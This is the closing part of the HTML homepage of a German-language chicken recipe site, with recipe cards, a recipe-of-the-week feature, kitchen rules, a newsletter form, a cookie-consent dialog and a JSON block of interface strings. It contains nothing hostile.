              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>40 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,9</strong><span>(401)</span></span>
                <a class="card-link" href="chicken-katsu-curry.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="curry" data-search="cremiges hähnchen-handi curry curry ein handi ist ein schwerer tontopf, aber ein tiefer topf mit deckel erledigt dasselbe. der trick: das hähnchen zuerst anbraten, dann tomate und gewürze einkochen lassen, bis sich das öl absetzt, bevor die sahne dazukommt.">
            <div class="card-media">
              <img src="img/r6.jpg" alt="Cremiges Hähnchen-Handi" loading="lazy" width="700" height="700">
              <span class="badge ">Ein Topf</span>
              <button class="save-btn" type="button" data-save="creamy-chicken-handi" aria-pressed="false" aria-label="Cremiges Hähnchen-Handi speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Curry</span>
              <h3><a href="creamy-chicken-handi.php">Cremiges Hähnchen-Handi</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>50 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,7</strong><span>(259)</span></span>
                <a class="card-link" href="creamy-chicken-handi.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="sticky" data-search="klebrige hähnchen-lollis klebrig &amp; wings sticky ein chicken lollipop ist einfach eine hähnchenkeule, bei der das fleisch am knochen nach unten geschoben wird. zwei minuten pro stück, sieht nach party aus und gart viel schneller als ein ganzes flügelstück.">
            <div class="card-media">
              <img src="img/r7.jpg" alt="Klebrige Hähnchen-Lollis" loading="lazy" width="700" height="700">
              <span class="badge ">Partyessen</span>
              <button class="save-btn" type="button" data-save="chicken-lollipops" aria-pressed="false" aria-label="Klebrige Hähnchen-Lollis speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Klebrig &amp; Wings</span>
              <h3><a href="chicken-lollipops.php">Klebrige Hähnchen-Lollis</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>40 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,8</strong><span>(187)</span></span>
                <a class="card-link" href="chicken-lollipops.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="rice" data-search="hähnchen-gebratener reis in 15 minuten reisschüsseln rice gebratener reis ist eine technik, kein rezept. kalter reis, eine wirklich heiße pfanne und alles vorbereitet, bevor es losgeht. fünfzehn minuten vom kalten kühlschrank bis zur schüssel.">
            <div class="card-media">
              <img src="img/r8.jpg" alt="Hähnchen-Gebratener Reis in 15 Minuten" loading="lazy" width="700" height="700">
              <span class="badge quick">15 Min.</span>
              <button class="save-btn" type="button" data-save="chicken-fried-rice" aria-pressed="false" aria-label="Hähnchen-Gebratener Reis in 15 Minuten speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Reisschüsseln</span>
              <h3><a href="chicken-fried-rice.php">Hähnchen-Gebratener Reis in 15 Minuten</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>15 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,7</strong><span>(623)</span></span>
                <a class="card-link" href="chicken-fried-rice.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
      </div>

      <div class="empty-state" id="emptyState" hidden>
        <h3>Keine Rezepte gefunden</h3>
        <p>Versuche &bdquo;Curry&ldquo;, &bdquo;frittiert&ldquo; oder &bdquo;15 Min.&ldquo; &mdash; oder setze die Filter zur&uuml;ck.</p>
        <button class="btn btn-dark" type="button" id="resetFilters">Alle Rezepte zeigen</button>
      </div>
    </div>
  </section>

  <section class="section section-cream">
    <div class="container">
      <div class="spotlight">
        <div class="spotlight-img">
          <img src="img/spotlight.jpg" alt="Klebrige Ingwer-H&auml;hnchenst&uuml;cke in dunkler Glasur" width="700" height="700" loading="lazy">
        </div>
        <div class="spotlight-body">
          <span class="section-index section-index-light" aria-hidden="true">03</span>
          <span class="kicker">Rezept der Woche</span>
          <h2>Klebriges Ingwer-H&auml;hnchen</h2>
          <p>Ingwer, Soja und ein L&ouml;ffel Honig reduzieren zu einer Glasur, die an jedem St&uuml;ck haftet. Unser meistgekochtes Rezept dieses Monats &mdash; und in 35 Minuten fertig.</p>
          <div class="spotlight-meta">
            <span>35 Min.</span>
            <span>4 Portionen</span>
            <span>5,0 aus 512</span>
          </div>
          <div class="spotlight-actions">
            <a class="btn btn-primary" href="sticky-chicken.php">Zum Rezept</a>
            <button class="btn btn-ghost" type="button" data-save="sticky-chicken">F&uuml;r sp&auml;ter speichern</button>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="section section-white">
    <div class="container">
      <div class="section-head center">
        <span class="section-index" aria-hidden="true">04</span>
        <span class="kicker">So arbeiten wir</span>
        <h2>Vier K&uuml;chenregeln</h2>
      </div>
      <div class="rules">
        <div class="rule">
          <span class="rule-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
          </span>
          <h3>Dreimal gekocht</h3>
          <p>Nichts erscheint, bevor es in einer normalen Pfanne, auf einem normalen Herd, zweimal hintereinander funktioniert.</p>
        </div>
        <div class="rule">
          <span class="rule-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>
          </span>
          <h3>Gramm, nicht &bdquo;Tassen&ldquo;</h3>
          <p>Jede Menge wird einmal abgewogen und dann aufgeschrieben, damit dein Ergebnis zu unserem passt.</p>
        </div>
        <div class="rule">
          <span class="rule-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v18M5 8h14M5 8l3 8h8l3-8"/></svg>
          </span>
          <h3>Portionen skalierbar</h3>
          <p>Tippe in jedem Rezept auf 2, 4, 6 oder 8 und die Zutatenliste rechnet sofort um.</p>
        </div>
        <div class="rule">
          <span class="rule-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12h8"/></svg>
          </span>
          <h3>Keine Lebensgeschichten</h3>
          <p>Die Methode beginnt bei Schritt eins. Tipps, Alternativen und Lagerung stehen unten, wo sie hingeh&ouml;ren.</p>
        </div>
      </div>
    </div>
  </section>

  <section class="newsletter" id="newsletter">
    <div class="container newsletter-inner">
      <div>
        <h2>Jeden Donnerstag ein gutes H&auml;hnchenrezept.</h2>
        <p>Dazu der kostenlose 7-Tage-Plan: sieben Abendessen, eine Einkaufsliste.</p>
      </div>
      <form class="newsletter-form" id="newsletterForm" novalidate>
        <label class="sr-only" for="newsletterEmail">E-Mail-Adresse</label>
        <input id="newsletterEmail" type="email" placeholder="du@beispiel.de" autocomplete="email" required>
        <button class="btn btn-dark" type="submit">Senden</button>
      </form>
    </div>
  </section>

</main>

<div class="disclaimer-band" role="note">
  <div class="container">
    <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 11v5"/><path d="M12 7.5v.5"/></svg>
    <p>Haftungsausschluss: Rezepte und Informationen auf Chick Delights dienen der allgemeinen Information. Wir übernehmen keine Haftung für Richtigkeit, Genauigkeit, Vollständigkeit oder Nutzung der Inhalte sowie nicht für die Inhalte externer Links. Kochen bedeutet Hitze und rohes Fleisch — nutze immer dein eigenes Urteilsvermögen und beachte die Lebensmittelsicherheit. <a href="impressum.php">Vollständiger Haftungsausschluss</a></p>
  </div>
</div>

<footer class="site-footer">
  <div class="container footer-grid">
    <div class="footer-brand">
      <a class="brand footer-logo" href="./">
        <span class="brand-mark" aria-hidden="true">
          <svg viewBox="0 0 48 48" width="26" height="26" fill="currentColor" aria-hidden="true">
            <circle cx="16" cy="13" r="5.2"/>
            <circle cx="24" cy="9.5" r="5.8"/>
            <circle cx="32" cy="13" r="5.2"/>
            <circle cx="25.5" cy="27" r="14.5"/>
            <path d="M39 24 48 27.5 39 32Z"/>
            <path d="M36 34.5c3.2.4 5 3 4 6.3-3.2-.7-5.2-3.1-4-6.3Z"/>
            <circle cx="32" cy="24" r="2.6" fill="#1e3b2a"/>
            <circle cx="32.8" cy="23.3" r=".9" fill="#fffaf0"/>
          </svg>
        </span>
        <span class="brand-text">
          <strong>Chick Delights</strong>
          <small>Getestet, nie gehetzt</small>
        </span>
      </a>
      <p>Neun Hähnchenrezepte, jedes dreimal gekocht, bevor es erscheint. Geschrieben für kleine Küchen, kurze Abende und Menschen, die wirklich essen wollen.</p>
      <p class="footer-contact">Schreib uns: <a href="mailto:info@chickdelights.site">info@chickdelights.site</a><br><a href="tel:+1877-779-5576">+1 877-779-5576</a></p>
    </div>
    <div>
      <h3>Rezepte</h3>
      <ul>
        <li><a href="./#recipes" data-filter-link="all">Alle Rezepte</a></li>
        <li><a href="./#recipes" data-filter-link="crispy">Knusprig</a></li>
        <li><a href="./#recipes" data-filter-link="grilled">Gegrillt</a></li>
        <li><a href="./#recipes" data-filter-link="curry">Curry</a></li>
        <li><a href="./#recipes" data-filter-link="rice">Reisschüsseln</a></li>
      </ul>
    </div>
    <div>
      <h3>Küche</h3>
      <ul>
        <li><a href="kitchen-basics.php">Küchenwissen</a></li>
        <li><a href="about.php">Über uns</a></li>
        <li><a href="contact.php">Kontakt</a></li>
        <li><a href="privacy-policy.php">Datenschutz</a></li>
        <li><a href="terms.php">Nutzungsbedingungen</a></li>
        <li><a href="impressum.php">Impressum</a></li>
        <li><button class="footer-link" type="button" data-consent-open>Cookie-Einstellungen</button></li>
      </ul>
    </div>
    <div>
      <h3>Kontakt</h3>
      <address>
        Chick Delights<br>
        745 Baker Mill Lake Ln<br>
        Gaston, SC 29053<br>
        Vereinigte Staaten
      </address>
    </div>
  </div>
  <div class="container footer-bottom">
    <p>&copy; <span id="year">2026</span> Chick Delights. Alle Rechte vorbehalten.</p>
    <p>Getestet in einer Hobbyküche &bull; Keine medizinische oder ernährungswissenschaftliche Beratung</p>
  </div>
</footer>

<div class="overlay" id="overlay" hidden></div>
<aside class="drawer" id="savedDrawer" aria-label="Gespeicherte Rezepte" inert>
  <div class="drawer-head">
    <h2>Gespeicherte Rezepte <span class="drawer-count" id="drawerCount">(0)</span></h2>
    <button class="icon-btn" id="closeSaved" type="button" aria-label="Gespeicherte Rezepte schließen">&#10005;</button>
  </div>
  <div class="drawer-body" id="savedItems"></div>
  <div class="drawer-foot">
    <p class="drawer-note">Nur auf diesem Gerät gespeichert &mdash; kein Konto nötig.</p>
    <a class="btn btn-dark btn-block" href="./#recipes">Weiteres Rezept finden</a>
  </div>
</aside>

<div class="toast" id="toast" role="status" aria-live="polite"></div>

<section class="consent" id="consent" role="dialog" aria-labelledby="consentTitle" hidden>
  <div class="consent-box">
    <div class="consent-copy">
      <h2 id="consentTitle">Cookies und Werbung</h2>
      <p>Wir speichern deine Auswahl lokal in deinem Browser — nicht in einem Cookie. Werbe-Cookies werden nur gesetzt, wenn du sie erlaubst. Die Seite funktioniert in beiden Fällen vollständig.</p>
    </div>
    <div class="consent-main">
      <div class="consent-actions">
        <button class="btn btn-primary btn-sm" type="button" data-consent-choice="all">Alle akzeptieren</button>
        <button class="btn btn-outline btn-sm" type="button" data-consent-choice="essential">Nur notwendige</button>
        <button class="consent-link" type="button" data-consent-choice="settings" aria-expanded="false" aria-controls="consentPanel">Einstellungen</button>
      </div>
      <div class="consent-panel" id="consentPanel" hidden>
        <label class="consent-row">
          <input type="checkbox" checked disabled>
          <span><strong>Unbedingt erforderlich</strong><small>Merkt sich deine Auswahl und deine gespeicherten Rezepte. Immer aktiv.</small></span>
        </label>
        <label class="consent-row">
          <input type="checkbox" id="consentAds" value="ads">
          <span><strong>Werbung</strong><small>Erlaubt Google, Cookies für personalisierte Anzeigen zu setzen. Standardmäßig aus.</small></span>
        </label>
        <button class="btn btn-dark btn-sm" type="button" data-consent-choice="save">Auswahl speichern</button>
      </div>
    </div>
  </div>
</section>

<script type="application/json" id="ch-i18n">{"code":"de","decimal":",","js":{"saved_toast":"{name} gespeichert","removed_toast":"Aus den gespeicherten Rezepten entfernt","state_saved":"Gespeichert","btn_save_recipe":"Rezept speichern","btn_save_later":"Für später speichern","empty_title":"Noch keine gespeicherten Rezepte.","empty_hint":"Tippe bei einem Rezept auf das Herz, um es hier zu behalten.","view":"Rezept ansehen","remove":"Entfernen","open_saved":"Gespeicherte Rezepte öffnen","open_saved_n":"Gespeicherte Rezepte öffnen, {n} gespeichert","aria_save":"{name} speichern","aria_remove":"{name} aus den gespeicherten Rezepten entfernen","invalid_email":"Bitte gib eine gültige E-Mail-Adresse ein","newsletter_ok":"Du bist auf der Liste — willkommen in der Küche","name_required":"Bitte sag uns deinen Namen.","email_invalid":"Bitte gib eine gültige E-Mail-Adresse ein.","msg_required":"Bitte schreib eine kurze Nachricht.","check_fields":"Bitte prüfe die markierten Felder","contact_ok":"Danke — deine Nachricht ist unterwegs","scaled":"Skaliert auf {n} Portionen","serves_word":"Portionen"},"recipes":[{"slug":"crispy-chicken-karaage","name":"Knuspriges Hähnchen-Karaage","img":"img/r1.jpg","meta":"25 Min. · 4 Portionen · Knusprig"},{"slug":"buttermilk-fried-chicken","name":"Buttermilch-Fried-Chicken","img":"img/r2.jpg","meta":"45 Min. · 4 Portionen · Knusprig"},{"slug":"tandoori-chicken","name":"Tandoori-Hähnchen vom Blech","img":"img/r3.jpg","meta":"40 Min. · 4 Portionen · Gegrillt"},{"slug":"smoky-chicken-skewers","name":"Rauchige Hähnchenspieße","img":"img/r4.jpg","meta":"30 Min. · 4 Portionen · Spieße"},{"slug":"chicken-katsu-curry","name":"Hähnchen-Katsu-Curry","img":"img/r5.jpg","meta":"40 Min. · 4 Portionen · Curry"},{"slug":"creamy-chicken-handi","name":"Cremiges Hähnchen-Handi","img":"img/r6.jpg","meta":"50 Min. · 4 Portionen · Curry"},{"slug":"sticky-chicken","name":"Klebriges Ingwer-Hähnchen","img":"img/spotlight.jpg","meta":"35 Min. · 4 Portionen · Klebrig \u0026 Wings"},{"slug":"chicken-lollipops","name":"Klebrige Hähnchen-Lollis","img":"img/r7.jpg","meta":"40 Min. · 4 Portionen · Klebrig \u0026 Wings"},{"slug":"chicken-fried-rice","name":"Hähnchen-Gebratener Reis in 15 Minuten","img":"img/r8.jpg","meta":"15 Min. · 4 Portionen · Reisschüsseln"}]}</script>
<script src="assets/js/data.js"></script>
<script src="assets/js/app.js"></script>
<script src="assets/js/consent.js"></script>
<script src="assets/js/home.js"></script>
</body>
</html>
